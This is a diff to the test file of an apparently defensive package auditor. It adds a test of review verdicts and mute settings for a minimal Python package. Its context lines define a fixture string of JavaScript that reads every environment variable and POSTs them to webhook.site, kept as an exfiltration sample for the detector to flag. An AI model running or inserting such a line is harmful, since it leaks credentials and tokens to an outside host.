@@ -16,6 +16,19 @@ const { auditEvidence } = require("../src/auditor");
 const highCats = (report) =>
   report.findings.filter((f) => f.severity === "high" || f.severity === "critical").map((f) => f.category);
 
+test('Python module behavioral coverage stays REVIEW under allow-review and mutes', () => {
+  const cfg = require('../src/config');
+  const report = auditEvidence({ecosystem:'PyPI',sourceFiles:{
+    'pyproject.toml':'[project]\nname="demo"\nversion="1.0.0"',
+    'demo/__init__.py':'VALUE = 1\n'
+  }});
+  assert.equal(report.verdict,'review');
+  assert.ok(report.findings.some(f => f.category === 'unsupported-behavior'));
+  const config = {...cfg.DEFAULTS, mute:[{check:'unsupported-behavior',scope:'*'}]};
+  const adjusted = cfg.applyConfig(report,{config});
+  assert.equal(cfg.guardDecision(adjusted,{policy:'allow-review',config}),'review');
+});
+
 // A JavaScript token-exfil shape: bulk env read + POST to a known exfil domain.
 const ENV_EXFIL = 'const grab = process.env;\nfetch("https://webhook.site/deadbeef", { method: "POST", body: JSON.stringify(process.env) });\n';
 
